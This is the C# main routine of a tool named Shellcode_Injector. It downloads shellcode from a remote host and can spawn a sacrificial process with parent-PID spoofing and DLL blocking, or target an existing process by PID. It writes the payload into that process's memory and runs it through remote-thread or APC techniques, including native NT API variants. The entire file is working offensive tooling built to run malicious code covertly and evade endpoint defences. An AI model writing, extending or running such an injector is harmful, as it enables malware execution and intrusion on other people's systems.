using System;
using static Shellcode_Injector.WinApi;
using System.ComponentModel;

namespace Shellcode_Injector
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Initialize the class so the constructor can populate the static methods
            new WinApi();
            //Parse command line flags
            var arguments = new Parser(args);

            //Fetch shellcode
            byte[] shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);

            //Define Process info
            WinApi.PIN pinfo = new WinApi.PIN();

            if (arguments.pid == 0)  //Create sacrifical process
            {
                //Prepare process attributes
                WinApi.SINEX sin = Helpers.SetAtt(
                    (bool)arguments.process["spoof_ppid"],
                    (bool)arguments.process["block_dlls"],
                    arguments.ppid
                    );

                //Create the process that will be injected
                pinfo = Helpers.StartS(
                    sin,
                    (string)arguments.process["cmd"],
                    (string)arguments.process["cwd"]
                    );
            }
            else //Assume remote injection 
            {
                (pinfo.hProcess, pinfo.hThread) = Helpers.GetHand(arguments.pid);
            }

            //Memory allocation
            IntPtr mmr = IntPtr.Zero;
            switch (arguments.memory["technique"]) 
            {
                case "standard":
                    mmr = Helpers.MWrite(pinfo.hProcess, shellcode);
                    break;

                case "ntsection":
                    mmr = Helpers.NTMWrite(pinfo.hProcess, shellcode);
                    break;

                default:
                    Console.WriteLine("Memory allocation argument have a wrong value");
                    arguments.PrintHelp();
                    break;
            }

            //Shellcode execution
            switch (arguments.exec["technique"]) 
            {
                case "rthread":
                    Helpers.SCRun("crt", pinfo, mmr);
                    break;

                case "quapc" when arguments.pid ==0:
                    Helpers.SCRun("qua", pinfo, mmr);
                    break;

                case "ntthread":
                    Helpers.NTSCRun("ncte", pinfo, mmr);
                    break;

                case "ntqathread" when arguments.pid == 0:
                    Helpers.NTSCRun("nqat", pinfo, mmr);
                    break;

                default:
                    Console.WriteLine("Shellcode exec argument have a wrong value");
                    arguments.PrintHelp();
                    break;

            }
            //Close handles
            WinApi.CloseH(pinfo.hThread);
            WinApi.CloseH(pinfo.hProcess);
        }
    }
}
